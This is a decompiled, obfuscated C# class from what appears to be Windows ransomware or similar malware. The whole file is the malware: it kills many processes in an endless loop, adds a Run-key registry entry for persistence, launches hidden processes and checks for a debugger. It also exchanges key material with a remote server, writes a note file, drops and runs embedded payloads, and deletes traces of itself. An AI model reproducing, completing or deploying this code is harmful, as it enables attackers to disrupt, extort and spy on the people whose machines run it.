using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

public sealed class GClass1
{
	private sealed class Class6
	{
		public string string_0;

		internal bool method_0(Process process_0)
		{
			return process_0.ProcessName == string_0;
		}
	}

	private sealed class Class7
	{
		public Action action_0;

		internal void method_0()
		{
			action_0();
		}
	}

	private bool bool_0;

	private bool bool_1;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private GClass2 gclass2_0;

	private List<Task> list_0;

	public GClass1()
	{
		method_15(new GClass2(this));
		method_13(Class4.smethod_0(-1659690257));
		method_11(string.Empty);
		method_9(string.Empty);
		method_5(string.Empty);
		method_3(bool_2: false);
		method_17(new List<Task>());
	}

	public bool method_0()
	{
		return bool_0;
	}

	public void method_1(bool bool_2)
	{
		bool_0 = bool_2;
	}

	public bool method_2()
	{
		return bool_1;
	}

	public void method_3(bool bool_2)
	{
		bool_1 = bool_2;
	}

	public string method_4()
	{
		return string_0;
	}

	public void method_5(string string_5)
	{
		string_0 = string_5;
	}

	public string method_6()
	{
		return string_1;
	}

	public void method_7(string string_5)
	{
		string_1 = string_5;
	}

	public string method_8()
	{
		return string_2;
	}

	public void method_9(string string_5)
	{
		string_2 = string_5;
	}

	public string method_10()
	{
		return string_3;
	}

	public void method_11(string string_5)
	{
		string_3 = string_5;
	}

	public string method_12()
	{
		return string_4;
	}

	public void method_13(string string_5)
	{
		string_4 = string_5;
	}

	public GClass2 method_14()
	{
		return gclass2_0;
	}

	public void method_15(GClass2 gclass2_1)
	{
		gclass2_0 = gclass2_1;
	}

	public List<Task> method_16()
	{
		return list_0;
	}

	public void method_17(List<Task> list_1)
	{
		list_0 = list_1;
	}

	public void method_18()
	{
		method_1(bool_2: false);
		method_27(method_36);
		method_26();
		method_27(method_35);
		method_27(method_28);
		method_27(method_29);
		method_27(method_30);
		method_27(method_33);
		method_27(method_31);
		method_27(method_34);
		method_27(method_14().method_4);
		method_27(method_23);
		method_1(bool_2: true);
		method_27(method_36);
		for (int i = 0; i < method_16().Count; i++)
		{
			method_16()[i].Start();
			method_16()[i].Wait();
		}
	}

	public void method_19()
	{
		try
		{
			List<Process> list = Process.GetProcesses().ToList();
			List<string> list2 = new List<string>
			{
				Class4.smethod_0(-1659690294),
				Class4.smethod_0(-1659690300),
				Class4.smethod_0(-1659690283),
				Class4.smethod_0(-1659690336),
				Class4.smethod_0(-1659690319),
				Class4.smethod_0(-1659690365),
				Class4.smethod_0(-1659690350),
				Class4.smethod_0(-1659690392),
				Class4.smethod_0(-1659690381),
				Class4.smethod_0(-1659690423),
				Class4.smethod_0(-1659690406),
				Class4.smethod_0(-1659690411),
				Class4.smethod_0(-1659690463),
				Class4.smethod_0(-1659690444),
				Class4.smethod_0(-1659690490),
				Class4.smethod_0(-1659690479),
				Class4.smethod_0(-1659690004),
				Class4.smethod_0(-1659689985),
				Class4.smethod_0(-1659689996),
				Class4.smethod_0(-1659690042),
				Class4.smethod_0(-1659690026),
				Class4.smethod_0(-1659690053),
				Class4.smethod_0(-1659690098),
				Class4.smethod_0(-1659690087),
				Class4.smethod_0(-1659690136),
				Class4.smethod_0(-1659690139),
				Class4.smethod_0(-1659690128),
				Class4.smethod_0(-1659690163),
				Class4.smethod_0(-1659690146),
				Class4.smethod_0(-1659690200),
				Class4.smethod_0(-1659690229),
				Class4.smethod_0(-1659690211),
				Class4.smethod_0(-1659690771),
				Class4.smethod_0(-1659690768),
				Class4.smethod_0(-1659690789),
				Class4.smethod_0(-1659690795),
				Class4.smethod_0(-1659690820),
				Class4.smethod_0(-1659690868),
				Class4.smethod_0(-1659690850),
				Class4.smethod_0(-1659690900),
				Class4.smethod_0(-1659690887),
				Class4.smethod_0(-1659690892),
				Class4.smethod_0(-1659690939)
			};
			List<Process> list3 = new List<Process>();
			List<string> list4 = new List<string>
			{
				Class4.smethod_0(-1659690926),
				Class4.smethod_0(-1659690970),
				Class4.smethod_0(-1659690993)
			};
			foreach (Process item in list)
			{
				try
				{
					string text = item.ProcessName.ToLower().Replace(Class4.smethod_0(-1659690521), string.Empty);
					bool flag = false;
					foreach (string item2 in list2)
					{
						if (text.IndexOf(item2, StringComparison.CurrentCultureIgnoreCase) >= 0)
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						list3.Add(item);
					}
					else
					{
						item.Kill();
					}
				}
				catch
				{
				}
			}
			list = list3;
			list.Distinct();
			list3 = null;
			while (true)
			{
				foreach (Process item3 in Process.GetProcesses().ToList())
				{
					try
					{
						Class6 @class = new Class6();
						@class.string_0 = item3.ProcessName;
						if (list.FirstOrDefault(@class.method_0) == null)
						{
							item3.MainModule!.FileName!.ToString().ToLower().Replace(Class4.smethod_0(-1659690521), string.Empty);
							if (@class.string_0.IndexOf(list4[0]) < 0 && @class.string_0.IndexOf(list4[1]) < 0 && @class.string_0.IndexOf(list4[2]) < 0)
							{
								item3.Kill();
								item3.Kill();
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void method_20()
	{
		try
		{
			method_23();
			Registry.CurrentUser.OpenSubKey(Class4.smethod_0(-1659690497), writable: true)!.SetValue(Class4.smethod_0(-1659690589), Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	public void method_21()
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = Class4.smethod_0(-1659690569),
				Arguments = Class4.smethod_0(-1659690623)
			};
			process.Start();
		}
		catch
		{
		}
	}

	public void method_22()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Class4.smethod_0(-1659690636));
			if (registryKey.GetValue(Class4.smethod_0(-1659690700)) == null)
			{
				registryKey.SetValue(Class4.smethod_0(-1659690700), Class4.smethod_0(-1659690721));
			}
			else
			{
				registryKey.DeleteValue(Class4.smethod_0(-1659690700));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern bool IsDebuggerPresent();

	private void method_23()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(Class4.smethod_0(-1659690497), writable: true)!.DeleteValue(Class4.smethod_0(-1659690589));
		}
		catch
		{
		}
	}

	public byte[] method_24(byte[] byte_0)
	{
		try
		{
			string text = byte_0.smethod_0();
			List<string> list = new List<string>();
			string text2 = string.Empty;
			int num = 0;
			int length = text.Length;
			while (num < length)
			{
				string text3 = text[num].ToString();
				if (text3 == Class4.smethod_0(-1659690729))
				{
					num++;
					continue;
				}
				if (char.IsDigit(text[num + 1]))
				{
					num++;
					text3 = string.Format(Class4.smethod_0(-1659689233), text3, text[num]);
				}
				string text4 = text[num + 1].ToString();
				if (text4 == Class4.smethod_0(-1659690729))
				{
					try
					{
						if (text[num + 2].ToString() == Class4.smethod_0(-1659690729))
						{
							list.Add((int.Parse(text3) / 5).ToString());
						}
						else
						{
							list.Add(Class4.smethod_0(-1659689222)[int.Parse(text3)].ToString());
						}
					}
					catch
					{
						list.Add(Class4.smethod_0(-1659689222)[int.Parse(text3)].ToString());
					}
					num++;
				}
				else
				{
					Console.WriteLine(text4);
				}
			}
			list.Reverse();
			foreach (string item in list)
			{
				text2 += item;
			}
			text2 = text2.smethod_2().smethod_0();
			return text2.smethod_2();
		}
		catch
		{
			return byte_0;
		}
	}

	public byte[] method_25(byte[] byte_0)
	{
		try
		{
			string text = byte_0.smethod_0();
			string text2 = string.Empty;
			List<string> list = new List<string>();
			string text3 = text;
			for (int i = 0; i < text3.Length; i++)
			{
				char value = text3[i];
				if (Class4.smethod_0(-1659689222).Contains(value.ToString()))
				{
					list.Add(Class4.smethod_0(-1659689222).IndexOf(value) + Class4.smethod_0(-1659690729));
				}
				else
				{
					list.Add(int.Parse(value.ToString()) * 5 + Class4.smethod_0(-1659689287));
				}
			}
			list.Reverse();
			foreach (string item in list)
			{
				text2 += item;
			}
			byte_0 = text2.smethod_2();
			return byte_0;
		}
		catch
		{
			return byte_0;
		}
	}

	public void method_26()
	{
		method_27(method_22);
		method_27(method_21);
		method_27(method_20);
	}

	public void method_27(Action action_0)
	{
		Class7 @class = new Class7();
		@class.action_0 = action_0;
		method_16().Add(new Task(@class.method_0));
	}

	public void method_28()
	{
		try
		{
			if (method_32())
			{
				string empty = string.Empty;
				if (File.Exists(Class4.smethod_0(-1659689296)))
				{
					byte[] byte_ = File.ReadAllBytes(Class4.smethod_0(-1659689296)).smethod_4();
					byte_ = method_24(byte_);
					method_11(byte_.smethod_0());
					if (method_10().Contains(Class4.smethod_0(-1659689337)))
					{
						method_7(method_10().Split(new char[1] { '|' })[0]);
					}
					try
					{
						File.Delete(Class4.smethod_0(-1659689296));
					}
					catch
					{
					}
					byte_ = null;
					return;
				}
				empty = Class4.smethod_0(-1659689313);
				while (true)
				{
					using WebClient webClient = new WebClient();
					try
					{
						string string_ = webClient.DownloadString(method_12() + Class4.smethod_0(-1659689363) + empty);
						if (empty.Contains(Class4.smethod_0(-1659689399)))
						{
							Thread.Sleep(50);
							method_3(bool_2: true);
							method_28();
							break;
						}
						method_11(string_);
						if (method_10().Contains(Class4.smethod_0(-1659689337)))
						{
							method_7(method_10().Split(new char[1] { '|' })[0]);
						}
						try
						{
							File.Delete(Class4.smethod_0(-1659689296));
							break;
						}
						catch
						{
							break;
						}
					}
					catch
					{
						Thread.Sleep(100);
					}
				}
				return;
			}
			if (File.Exists(Class4.smethod_0(-1659689296)))
			{
				byte[] byte_2 = File.ReadAllBytes(Class4.smethod_0(-1659689296)).smethod_4();
				byte_2 = method_24(byte_2);
				method_11(byte_2.smethod_0());
				if (method_10().Contains(Class4.smethod_0(-1659689337)))
				{
					method_7(method_10().Split(new char[1] { '|' })[0]);
				}
				try
				{
					File.Delete(Class4.smethod_0(-1659689296));
					return;
				}
				catch
				{
					return;
				}
			}
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}

	public void method_29()
	{
		try
		{
			if (method_32())
			{
				string data = Class4.smethod_0(-1659689403);
				WebClient webClient = new WebClient();
				try
				{
					string text = webClient.UploadString(method_12() + Class4.smethod_0(-1659689430), data);
					if (text.Contains(Class4.smethod_0(-1659689399)))
					{
						Thread.Sleep(100);
						method_3(bool_2: true);
						method_29();
					}
					else
					{
						method_9(text);
					}
					return;
				}
				finally
				{
					((IDisposable)webClient).Dispose();
				}
			}
			method_9(Class4.smethod_0(-1659689420));
		}
		catch
		{
		}
	}

	public void method_30()
	{
		try
		{
			if (method_32())
			{
				WebClient webClient = new WebClient();
				try
				{
					string data = Class4.smethod_0(-1659689446) + method_8().smethod_2().smethod_3().smethod_0() + Class4.smethod_0(-1659688979);
					string text = webClient.UploadString(method_12() + Class4.smethod_0(-1659688988), data);
					if (text.Contains(Class4.smethod_0(-1659689399)))
					{
						Thread.Sleep(50);
						method_3(bool_2: true);
						method_30();
					}
					else
					{
						text = text.smethod_2().smethod_4().smethod_0();
						string[] array = text.Split(new char[1] { '|' });
						method_14().byte_0 = array[0].smethod_2().smethod_4().smethod_4()
							.smethod_4()
							.smethod_4()
							.smethod_4();
						method_14().byte_1 = array[1].smethod_2().smethod_4().smethod_4()
							.smethod_4()
							.smethod_4()
							.smethod_4();
					}
					return;
				}
				finally
				{
					((IDisposable)webClient).Dispose();
				}
			}
			do
			{
				method_14().method_14();
			}
			while (method_14().byte_0.Length != 32 || method_14().byte_1.Length != 16);
			byte[] byte_ = method_25(method_14().byte_0.smethod_3());
			string text2 = string.Concat(str2: method_25(method_14().byte_1.smethod_3()).smethod_3().smethod_0(), str0: byte_.smethod_3().smethod_0(), str1: Class4.smethod_0(-1659689337));
			method_5(method_25(text2.smethod_2()).smethod_3().smethod_0());
			method_9(Class4.smethod_0(-1659689420));
		}
		catch
		{
			Thread.Sleep(100);
			method_30();
		}
	}

	public void method_31()
	{
		try
		{
			string path = Class4.smethod_0(-1659689020);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
			string empty = string.Empty;
			empty = ((method_4().Length <= 0) ? (Class4.smethod_0(-1659689029) + method_8() + Class4.smethod_0(-1659689171) + method_10().Replace(Class4.smethod_0(-1659689337), Environment.NewLine) + Class4.smethod_0(-1659689742)) : (Class4.smethod_0(-1659689029) + method_8() + Class4.smethod_0(-1659689139) + method_4() + Class4.smethod_0(-1659689171) + method_10().Replace(Class4.smethod_0(-1659689337), Environment.NewLine) + Class4.smethod_0(-1659689742)));
			File.WriteAllText(path, empty);
		}
		catch
		{
			Thread.Sleep(100);
			method_31();
		}
	}

	public bool method_32()
	{
		try
		{
			if (!method_2())
			{
				using (WebClient webClient = new WebClient())
				{
					if (webClient.DownloadString(Class4.smethod_0(-1659689783)).Length > 10)
					{
						return true;
					}
					return false;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void method_33()
	{
		try
		{
			string text = method_4() + Class4.smethod_0(-1659689775) + method_8() + Class4.smethod_0(-1659689775) + method_10();
			text = text.smethod_2().smethod_3().smethod_3()
				.smethod_0();
			string text2 = Path.GetTempPath() + Class4.smethod_0(-1659689296);
			if (File.Exists(text2))
			{
				try
				{
					File.Delete(text2);
				}
				catch
				{
				}
			}
			File.WriteAllText(text2, text);
			new FileInfo(text2).Attributes = FileAttributes.Hidden;
		}
		catch
		{
		}
	}

	public void method_34()
	{
		try
		{
			byte[] bytes = Class20.smethod_3();
			string text = Path.GetTempPath() + Class4.smethod_0(-1659689815);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
			}
			try
			{
				File.WriteAllBytes(text, bytes);
				bytes = null;
				GC.Collect();
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = text
				};
				process.Start();
				new FileInfo(text).Attributes = FileAttributes.Hidden;
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_35()
	{
		try
		{
			byte[] bytes = Class20.smethod_4();
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class4.smethod_0(-1659689851);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
			}
			try
			{
				File.WriteAllBytes(text, bytes);
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = text,
					Verb = Class4.smethod_0(-1659689836)
				};
				process.Start();
				new FileInfo(text).Attributes = FileAttributes.Hidden;
				bytes = null;
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_36()
	{
		try
		{
			foreach (Process item6 in Process.GetProcesses().ToList())
			{
				try
				{
					if (item6.ProcessName.ToLower().Replace(Class4.smethod_0(-1659690521), string.Empty).Contains(Class4.smethod_0(-1659689888)))
					{
						item6.Kill();
					}
				}
				catch
				{
				}
			}
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class4.smethod_0(-1659689851);
			try
			{
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch
			{
			}
			string item = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + Class4.smethod_0(-1659689860);
			string item2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class4.smethod_0(-1659689905);
			string item3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class4.smethod_0(-1659689893);
			string item4 = Path.GetTempPath() + Class4.smethod_0(-1659689897);
			string item5 = Path.GetTempPath() + Class4.smethod_0(-1659689950);
			List<string> obj3 = new List<string> { item4, item5, item3, item2, item };
			string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().Location);
			foreach (string item7 in obj3)
			{
				try
				{
					File.Delete(item7 + Class4.smethod_0(-1659689924) + fileName);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(item7);
				}
				catch
				{
				}
			}
			if (method_0())
			{
				Application.Exit();
			}
		}
		catch
		{
		}
	}
}
